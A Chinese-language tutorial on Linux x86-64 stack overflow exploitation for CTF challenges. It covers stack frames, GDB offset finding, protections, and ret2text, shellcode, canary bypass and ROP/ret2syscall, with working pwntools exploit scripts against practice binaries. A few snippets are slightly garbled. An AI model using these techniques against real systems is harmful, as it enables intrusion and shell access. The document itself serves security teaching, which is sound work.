####  1.1.1ELF 可执行文件格式与内存布局
在 Linux 系统中，二进制程序通常以 ELF（Executable and Linkable Format）格式存在。当一个 ELF 文件被加载到内存中运行时，它会映射为特定的虚拟内存布局。理解这一布局是理解溢出的前提 。

+ **代码段（.text）**：存放 CPU 执行的机器指令。通常是只读的（Read-Only）和可执行的（Executable）。如果攻击者能够将指令指针（RIP）指向这里，CPU 就会忠实地执行其中的代码。
+ **数据段（.data）**：存放已初始化的全局变量和静态变量。
+ **BSS 段（.bss）**：存放未初始化的全局变量。在程序加载时，这块内存会被清零。由于它通常是可读写的，常被利用于存放攻击者构造的数据。
+ **堆（Heap）**：用于动态内存分配（如 `malloc`）。堆从低地址向高地址增长。
+ **栈（Stack）**：这是栈溢出攻击的核心区域。用于存放局部变量、函数参数和函数返回地址。栈的增长方向与堆相反，是从**高地址向低地址**增长 。
+ ![](https://cdn.nlark.com/yuque/0/2026/webp/58878864/1769219011600-a1bc2d55-265f-4f43-9f49-6f75461fe187.webp)

#### 1.1.2 寄存器架构（x86 与 x86-64）
寄存器是 CPU 内部极其高速的存储单元，是数据处理和指令执行的直接场所。在 Pwn 中，我们主要关注通用寄存器和特殊寄存器。目前主流的架构分为 32 位（x86）和 64 位（x86-64/AMD64）。

**通用寄存器及其用途：**

| **64位寄存器 (8字节)** | **32位寄存器 (4字节)** | **主要用途** |
| --- | --- | --- |
| **RAX** | EAX | **累加器**。通常用于存储函数的返回值。在系统调用（Syscall）中存储调用号。 |
| **RBX** | EBX | **基址寄存器**。通常作为数据指针。 |
| **RCX** | ECX | **计数寄存器**。常用于循环计数。在 64 位函数调用中作为第 4 个参数。 |
| **RDX** | EDX | **数据寄存器**。常配合 RAX 进行运算。在 64 位函数调用中作为第 3 个参数。 |
| **RSI** | ESI | **源变址寄存器**。常用于字符串操作。在 64 位函数调用中作为第 2 个参数。 |
| **RDI** | EDI | **目的变址寄存器**。常用于字符串操作。在 64 位函数调用中作为 **第 1 个参数**。 |
| **RBP** | EBP | **基址指针寄存器**。指向当前栈帧（Stack Frame）的底部，是栈操作的基准点 。 |
| **RSP** | ESP | **栈指针寄存器**。始终指向栈顶，随着 Push/Pop 操作动态变化 。 |
| **RIP** | EIP | **指令指针寄存器**。存放**下一条**即将执行指令的地址。这是攻击者的终极目标——控制了 RIP 就控制了程序的执行流 。 |
| **R8 - R15** | N/A | 64 位架构新增的通用寄存器。 |


**重要差异：函数调用约定（Calling Convention）**

+ **x86 (32位)**：函数参数通过**栈**传递。参数从右向左压栈，最后压入返回地址。
+ **x64 (64位)**：前 6 个参数依次通过寄存器 **RDI, RSI, RDX, RCX, R8, R9** 传递。超过 6 个的参数才通过栈传递 。
+ 这一差异直接决定了我们在构造攻击载荷（Payload）时的策略。在 64 位系统中，仅仅覆盖栈上的数据不足以控制函数参数，我们必须想办法操作寄存器，这通常需要 ROP 技术。

#### 1.2.3 关键汇编指令
+ `MOV dest, src`：数据传送。将 src 的内容复制到 dest。
+ `PUSH src`：压栈。先将 RSP 减小（因为栈向低地址增长），然后将 src 的值存入 RSP 指向的内存 。
    - `RSP = RSP - 8`
    - `*RSP = src`
+ `POP dest`：出栈。将 RSP 指向的内存值读入 dest，然后将 RSP 增大。
    - `dest = *RSP`
    - `RSP = RSP + 8`
+ `LEAVE`：恢复栈帧。等价于 `MOV RSP, RBP` 然后 `POP RBP`。用于函数退出前清理现场。
+ `RET`：返回。等价于 `POP RIP`。这是栈溢出利用的“引爆点”。它从栈顶弹出一个值赋给 RIP，CPU 接着跳转到该地址执行。如果栈顶的值被攻击者修改为恶意地址，攻击就生效了 。

#### 1.2.4 字节序（Endianness）
在内存中存储多字节数据（如 64 位的地址）时，有两种顺序：

+ **大端序（Big-Endian）**：高位字节存放在低地址。
+ **小端序（Little-Endian）**：低位字节存放在低地址。x86/x64 架构使用小端序。 例如，地址 `0x7fffffffe4b0` 在内存中存放的顺序是 `b0 e4 ff ff ff 7f 00 00`。在编写 Python 攻击脚本时，我们需要使用 `p64()` 函数将数值转换为这种小端序的字节流 。

---

## 2. 深入理解栈数据结构与内存布局
为什么会有“栈溢出”？要回答这个问题，必须深入理解栈在函数调用过程中的生命周期。栈不仅仅是一块内存，它是维护程序逻辑上下文（Context）的核心数据结构 。

```bash
                                           +-----------------+
                                           |     retaddr     |
                                           +-----------------+
                                           |     saved ebp   |
                                    ebp--->+-----------------+
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                                           |                 |
                              s,ebp-0x14-->+-----------------+
```

栈的简单结构

### 2.1 栈的动态变化：函数调用全过程
当一个函数（Caller）调用另一个函数（Callee）时，栈会发生一系列精确的操作来保存现场，以便 Callee 执行完毕后能回到 Caller 继续执行。这个过程称为“栈帧的建立与销毁”。

**Step 1: 参数入栈（32位）或 寄存器赋值（64位）**

在调用发生前，参数被准备好。

**Step 2: 保存返回地址（The Return Address）** 执行 `call func` 指令时，CPU 会自动将 `call` 指令的**下一条指令地址**压入栈顶。这个地址就是“返回地址”。这是攻击者梦寐以求想要覆盖的数据 。

**Step 3: 保存调用者的基址指针（Saved RBP）**

进入 Callee 后，第一件事通常是保存 Caller 的 RBP，以便后续恢复。

Đoạn mã

```z80
push rbp
```

**Step 4: 建立新的栈帧（Set up Stack Frame）**

将当前的 RSP 赋值给 RBP，标志着新栈帧的开始。

```z80
mov rbp, rsp
```

此时，RBP 指向当前栈帧的“底部”（虽然物理地址较高）。

**Step 5: 分配局部变量空间**

将 RSP 减去一个数值，为局部变量腾出空间。

```z80
sub rsp, 0x40  ; 分配 64 字节空间
```

**此时栈的布局（从高地址到低地址）：**

| **内存内容** | **说明** | **攻击价值** |
| --- | --- | --- |
| **Arguments** | 函数参数（32位） | 影响函数逻辑 |
| **Return Address** | 返回地址（8字节） | **最高价值**。控制执行流 |
| **Saved RBP** | 保存的旧 RBP（8字节） | 影响栈迁移（Stack Pivot） |
| **Local Variables** | 局部变量缓冲区（如 char buf） | **溢出起点**。注入数据 |
| **Top of Stack** | RSP 指向此处 | |


### 2.2 为什么会有栈溢出漏洞？
C 语言的设计哲学是“信任程序员”和“追求性能”。标准库中的许多字符串处理函数（如 `strcpy`, `gets`, `strcat`）在复制数据时，**不检查目标缓冲区的大小**。

假设源代码如下：

```c
void vulnerable_function() {
    char buffer;
    gets(buffer); // 危险！
}
```

gets函数 会一直读取用户输入，直到遇到换行符。如果用户输入了 100 个 'A'：

1. 前 64 个 'A' 填满了 `buffer`。
2. 接下来的 8 个 'A' 覆盖了 **Saved RBP**。
3. 再接下来的 8 个 'A' 覆盖了 **Return Address**。
4. 剩余的 'A' 继续向高地址覆盖。

当 `vulnerable_function` 执行完毕，运行到 `ret` 指令时，CPU 会执行 `pop rip`。此时栈顶的值已经被我们覆盖成了 `0x4141414141414141`（'A' 的 ASCII 码）。CPU 试图跳转到这个地址去执行指令。由于这是一个无效地址，程序通常会报“段错误”（Segmentation Fault）并崩溃。但如果我们精心构造，将这里的 'A' 换成一个合法的代码地址，CPU 就会跳转过去执行，这就完成了攻击 。

---

## 3. 动态调试与分析艺术
假设我们有一个名为 `vuln` 的可执行文件。

+ `gdb./vuln`：启动调试。
+ `checksec`：(Pwndbg ) 检查二进制文件的保护机制（NX, Canary, PIE, RELRO）。
+ `run` (或 `r`)：开始运行程序。
+ `break *0x401123` (或 `b`)：在特定内存地址下断点。
+ `next` (或 `n`)：单步步过（不进入函数）。
+ `step` (或 `s`)：单步步入（进入函数）。
+ `continue` (或 `c`)：继续执行直到下一个断点。
+ `x/20gx $rsp`：查看栈内存。
    - `x`：Examine（检查）。
    - `20`：显示 20 个单位。
    - `g`：Giant word（8字节，64位系统常用）。
    - `x`：以十六进制显示。
    - `$rsp`：从 RSP 指向的地址开始。
+ `info registers` (或 `i r`)：查看所有寄存器的值。
+ `disassemble main`：反汇编 main 函数代码。

### 确定溢出偏移（Offset）
这是利用栈溢出的第一步：我们需要确切地知道，填充多少字节的垃圾数据，才能刚好触碰到 Return Address 。

**方法一：手动计算**

通过 IDA Pro 或 Ghidra 反编译，查看缓冲区相对于 RBP 的偏移。

例如：`char buf` 通常在 `rbp-0x40`。

返回地址在 `rbp+0x8`。

所以偏移量 = 0x40 (64) + 0x8 (Saved RBP 8字节) = 72 字节。

**方法二：Cyclic Pattern（动态测量）**

这是更通用的方法。Pwntools 提供了一个工具 `cyclic`，生成特定规律的字符串（De Bruijn 序列）。

1. 生成 100 字节的 Pattern：

```bash
cyclic 100
# 输出: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama...
```

2. 在 GDB 中运行程序，输入该字符串。
3. 程序崩溃。查看崩溃时的栈顶或 RIP 寄存器。
    - 在 64 位系统中，程序通常会在 `ret` 指令处崩溃，因为弹出的地址无效。此时查看栈顶的值。
    - 假设 GDB 显示栈顶（RSP）的值为 `0x6161616c`（对应字符 'laaa'）。
4. 计算偏移：

```bash
cyclic -l 0x6161616c
# 输出: 72
```

这意味着我们需要 72 个字节的填充，第 73-80 个字节将覆盖 Return Address 。

---

## 4. 基础防护机制概览
在开始实战前，必须看懂 `checksec` 的输出，这决定了我们的攻击路径 。

1. **Arch (架构)**: x86 或 amd64。决定了寄存器大小和系统调用方式。
2. **RELRO (Relocation Read-Only)**:
    - No RELRO: GOT 表可写。
    - Partial RELRO: GOT 表可写（常见）。
    - Full RELRO: GOT 表只读，无法修改 GOT 表劫持函数调用。
3. **Stack Canary (栈哨兵)**:
    - Enabled: 栈中插入了校验值，防止连续覆盖。
    - Disabled: 可以随意溢出。
4. **NX (No-Execute) / DEP**:
    - Enabled: 栈和堆不可执行。无法直接运行 Shellcode，必须使用 ROP。
    - Disabled: 栈可执行。可以直接跳到栈上执行 Shellcode。
5. **PIE (Position Independent Executable)**:
    - Enabled: 代码段地址随机化。不知道函数地址。
    - Disabled: 代码段地址固定。可以直接硬编码函数地址。

---

## 5. 实战演练 I：Ret2Text（有后门的程序）
这是最简单的场景。目标程序中存在一个 `win()` 或 `backdoor()` 函数，能直接给 Shell 或打印 Flag，但正常逻辑不会调用它。我们要做的就是把 `main` 函数的返回地址改为 `win` 函数的地址。

**题目特征**：

+ Stack Overflow 漏洞存在（如 `gets`）。
+ **NX Enabled** (无所谓，因为利用的是程序自带代码)。
+ **PIE Disabled** (关键，地址固定)。
+ **Canary Disabled**。

### 5.1 攻击步骤
1. **静态分析**：使用 IDA/Ghidra 或 `objdump -d./pwn | grep win` 找到 `win` 函数的地址。假设为 `0x401176`。
2. **动态调试**：使用 `cyclic` 测出溢出偏移量。假设为 40。
3. **编写脚本**：使用 Pwntools。

### 5.2 Pwntools 脚本示例
Python

```python
from pwn import *

# 1. 设置目标架构
context.arch = 'amd64'
context.log_level = 'debug'

# 2. 启动进程
p = process('./ret2text_challenge')
# p = remote('ip', port) # 远程连接

# 3. 准备数据
offset = 40
win_addr = 0x401176

# 4. 构造 Payload
# b'A' * 40 填充缓冲区和 Saved RBP
# p64(win_addr) 将地址打包成 8 字节小端序
payload = b'A' * offset + p64(win_addr)

# 5. 发送 Payload
p.sendline(payload)

# 6. 交互
p.interactive()
```

### 5.3 栈对齐（Stack Alignment）
在 Ubuntu 18.04 及更高版本的 64 位系统中，调用 `system` 或 `printf` 等库函数时，要求栈顶指针 RSP 必须是 **16 字节对齐**的（即 RSP 的末尾必须是 0）。如果直接跳转到 `win` 函数，且 `win` 函数第一条指令就是调用 `system`，可能会因为栈未对齐而导致 `movaps` 指令崩溃（Segfault）。

**解决方案**：在跳转到 `win` 之前，先跳转到一个 `ret` 指令（Ret Gadget）。

`ret` 指令相当于 `pop rip`，会把 RSP 增加 8。这样原本不对应 16 的 RSP 就可能对齐了。

Payload 变为：`Padding + p64(ret_gadget) + p64(win_addr)`。

---

## 6. 实战演练 II：Shellcode 生成与利用（NX Disabled）
**场景**：程序没有后门函数，但是关闭了 NX 保护（Stack Executable）。 **目标**：将自己编写的机器码（Shellcode）注入栈中，并控制 RIP 跳转到栈上执行它 。

### 6.1 什么是 Shellcode？
Shellcode 是一段用于启动 Shell 的机器指令。在 Linux x64 下，通常是调用 `execve("/bin/sh", 0, 0)` 系统调用。

**汇编实现逻辑：**

1. 设置 RAX = 59 (syscall number for execve).
2. 设置 RDI = 指向 "/bin/sh" 字符串的地址.
3. 设置 RSI = 0.
4. 设置 RDX = 0.
5. 执行 `syscall`.

### 6.2 利用 Pwntools 生成 Shellcode
手写汇编比较繁琐，Pwntools 的 `shellcraft` 模块可以自动生成各种架构的 Shellcode 。

```python
# 生成 amd64 架构下 Linux 的 sh 脚本汇编代码
sc_asm = shellcraft.amd64.linux.sh()
# 编译成机器码
shellcode = asm(sc_asm)
```

### 6.3 攻击策略：NOP Sled 与 JMP RSP
我们在栈上注入 Shellcode，但问题是：我们怎么知道 Shellcode 在栈上的确切地址？

栈地址在不同环境（本地 vs 远程）可能会有微小变化。

**方法：NOP Sled（滑雪橇）** NOP（机器码 `0x90`）指令什么都不做，CPU 读到它只会执行下一条。 我们在 Shellcode 前面填充大量的 NOP。只要 RIP 跳转到 NOP 区域的任意位置，CPU 就会一路滑下去，直到执行 Shellcode 。

**Payload 结构：**

`[ NOPs (100 bytes) ] + + [ Padding ] +`

然而，如果开启了 ASLR，栈地址是随机的，我们无法硬编码返回地址。这时候通常需要结合寄存器。如果函数返回时，某个寄存器（如 `RAX` 或 `RSP`）刚好指向我们的 Buffer，我们可以利用程序中自带的 `jmp rax` 或 `call rax` 指令（Gadget）来跳转。

如果可以直接泄露栈地址（例如程序打印了 Buffer 的地址），则直接填入该地址即可。

---

## 7. 实战演练 III：Canary 绕过技术
**场景**：开启了 Stack Canary 保护。 **原理**：编译器在 Stack Frame 的 Return Address 之前插入一个随机值（Canary）。函数返回前会检查这个值是否被修改。如果我们在溢出时覆盖了它，程序会报错 `*** stack smashing detected ***` 并终止，根本不会执行 `ret`。

Canary 的特点：

+ 通常是 8 字节（64位）。
+ 最低位字节通常是 `\x00`。这是为了防止 `printf` 等字符串函数意外打印出 Canary（字符串遇 `\0` 截断）。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58878864/1769218949712-3c56b946-1a8d-44da-920f-f09105846337.png)

### 7.1 方法一：泄露 Canary (Leak)
如果程序存在格式化字符串漏洞，或者可以通过溢出覆盖 Canary 的最低位 `\x00`，就可以读出 Canary。

**覆盖截断法**：

Canary 内存如：`00 a1 b2 c3...`

如果我们溢出，刚好把第一个字节 `00` 覆盖成 `61` ('a')。

Canary 变为：`61 a1 b2 c3...`

此时调用 `printf("%s", buffer)`，因为没有了 `\0` 截断，`printf` 会连着 Buffer 把后面的 Canary 也打印出来。

获取到 Canary 后，我们在构造 Payload 时，将正确的值填回去，就能骗过检查。

### 7.2 方法二：爆破 (Brute-force)
**适用场景**：服务器使用 `fork()` 处理网络请求。

**原理**：`fork()` 出来的子进程会完全拷贝父进程的内存，包括 Canary。这意味着每次连接的 Canary 都是一样的。

我们可以逐个字节地猜。

+ 先猜第 1 个字节（已知是 0x00，但如果是 Windows 或特殊环境可能不同）。
+ 猜第 2 个字节：发送 0x00，如果不崩溃，说明猜对；如果崩溃（Socket 断开），说明猜错，试 0x01...
+ 猜出第 2 个字节后，固定它，继续猜第 3 个。
+ 最多尝试 256 * 7 次即可拿到完整 Canary。这比暴力穷举 64 位数值要快得多 。

还有格式化字符串直接读取canary

---

## 8. 实战演练 IV：Ret2Syscall 与 ROP（无后门、NX 开启）
+ **NX Enabled**: 无法执行 Shellcode。
+ **No "Win" Function**: 必须自己构造系统调用。
+ **Static Link** (静态链接) 或 **Ret2Libc** (动态链接)。这里先讲最基础的利用程序自身 Gadget 的 Ret2Syscall。

### 8.1 ROP (Return Oriented Programming) 原理
既然不能写入新代码，我们就复用程序里已有的代码片段。这些片段以 `ret` 结尾，称为 **Gadget**。 通过精心排列栈上的返回地址，我们可以让 CPU 在执行完一个 Gadget 后，跳到下一个 Gadget，像拼积木一样拼出复杂的逻辑。(我们通过写rop链设置寄存器。然后调用system函数完成题目)

### 8.2 目标：拼凑 execve 系统调用
我们需要寻找以下 Gadgets（使用 `ROPgadget` 或 `ropper` 工具）：

1. `pop rdi; ret` ：用于设置 RDI 寄存器。
2. `pop rsi; ret` ：用于设置 RSI 寄存器。
3. `pop rdx; ret` ：用于设置 RDX 寄存器。
4. `pop rax; ret` ：用于设置 RAX 寄存器。
5. `syscall; ret` ：触发系统调用。
6. 寻找的指令：

```bash
ROPgadget --binary ret2libc1（自己的文件名） --only "pop|ret" |grep  'rdi'
//这里查询rdi为例//
```

此外，我们需要一个地址存放字符串 "/bin/sh"。可以使用程序中已有的（.data 段），或者利用 `read` 函数写一段进去。

### 8.3 ROP 链构造流程
假设我们找到了所有 Gadgets，且地址 `0x404000` 处有 "/bin/sh" 字符串。

**栈布局（Payload）设计：**

1. **Padding**: 填充溢出偏移。
2. **Gadget 1 Addr** (`pop rax; ret`)
3. **Value**: 59 (0x3b) -> 弹入 RAX
4. **Gadget 2 Addr** (`pop rdi; ret`)
5. **Value**: 0x404000 (ptr to "/bin/sh") -> 弹入 RDI
6. **Gadget 3 Addr** (`pop rsi; ret`)
7. **Value**: 0 -> 弹入 RSI
8. **Gadget 4 Addr** (`pop rdx; ret`)
9. **Value**: 0 -> 弹入 RDX
10. **Gadget 5 Addr** (`syscall`)

当函数返回时，它会依次执行上述指令，最终触发 `execve("/bin/sh", 0, 0)`，获取 Shell 。



Pwntools 提供了极其强大的 ROP 模块，可以自动寻找 Gadgets 并构建链条（但是一般还是需要自己写）：

```python
elf = ELF('./rop_challenge')
rop = ROP(elf)

# 假设程序中已经有了 /bin/sh 字符串
bin_sh_addr = next(elf.search(b'/bin/sh'))

# 自动生成调用 execve('/bin/sh', 0, 0) 的链
rop.execve(bin_sh_addr, 0, 0)

print(rop.dump()) # 打印生成的 ROP 链结构

payload = b'A' * offset + rop.chain()
p.sendline(payload)
```

如果程序是动态链接且没有静态的 `syscall` 片段，我们需要使用 **Ret2Libc** 技术：先泄露 `puts` 或 `write` 的真实地址，计算出 `libc` 的基地址，再调用 `libc` 中的 `system` 函数。这属于更进阶的内容，但在逻辑上依然是 ROP 的一种应用。

---

### 9 知识图谱回顾
+ **核心原理**：栈帧的 LIFO 结构、Return Address 的关键作用。
+ **工具使用**：GDB 动态调试查看内存，Pwntools 编写 Exploit。
+ **攻击演进**：
    - 简单的 Ret2Text（修改返回地址）。
    - Shellcode 注入（针对 NX 关闭）。
    - Canary 绕过（泄露与爆破）。
    - ROP / Ret2Syscall（针对 NX 开启）。

###  进阶学习路线
栈溢出仅仅是二进制安全的冰山一角。掌握上述内容后，建议继续探索：

1. **Ret2Libc & GOT/PLT Hijacking**：应对 ASLR 和动态链接的标准解法 。
2. **堆漏洞（Heap Exploitation）**：`malloc` 和 `free` 的机制极其复杂，涉及 Use-After-Free (UAF)、Double Free、Heap Overflow 等，是现代 Pwn 的主流 。
3. **格式化字符串漏洞（Format String）**：利用 `printf` 实现任意内存读写 。



